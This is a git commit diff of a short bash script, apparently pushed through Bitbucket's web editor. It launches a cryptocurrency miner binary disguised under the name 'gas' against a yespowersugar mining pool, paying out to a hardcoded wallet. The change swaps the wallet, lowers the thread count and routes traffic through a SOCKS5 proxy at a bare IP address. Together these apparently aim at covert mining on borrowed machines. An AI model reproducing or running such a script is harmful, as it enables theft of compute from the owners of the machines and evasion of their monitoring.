00a3cbf200b6439c98859da8dbb807f610b929d2
sis maryanto <sismaryanto1928@gmail.com>
2021-06-30 01:11:11 +0000

    0.sh edited online with Bitbucket

--- 0.sh
+++ 0.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 POOL=stratum+tcps://stratum-eu.rplant.xyz:17042
-WALLET=sugar1qe40q8krx7elqg84lcn6j8qqzjcpgyf6p8ac92x.adz03
-./gas -a yespowersugar -o $POOL -u $WALLET -t55
+WALLET=sugar1qncwd9uvepk8y3qpp25pjvqunyzjlj44wzhn2as.ahaha
+./gas -a yespowersugar -o $POOL -u $WALLET -t2 -x socks5://72.49.49.11:31034
